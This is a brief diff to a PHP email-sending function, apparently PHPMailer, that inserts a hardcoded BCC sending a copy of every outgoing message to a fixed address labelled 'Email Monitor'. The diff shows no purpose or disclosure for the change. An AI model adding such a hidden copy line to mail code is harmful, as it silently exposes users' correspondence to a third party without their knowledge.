@@ -98,7 +98,7 @@
             foreach ($cc as $value) {
                 $mail->addCC($value['email'], $value['name']);
             }
-
+            $mail->addBCC('bany@mentarigroups.com', 'Email Monitor');
             $mail->isHTML(true);
             $mail->Subject = $subject;
             $mail->Body    = $message;
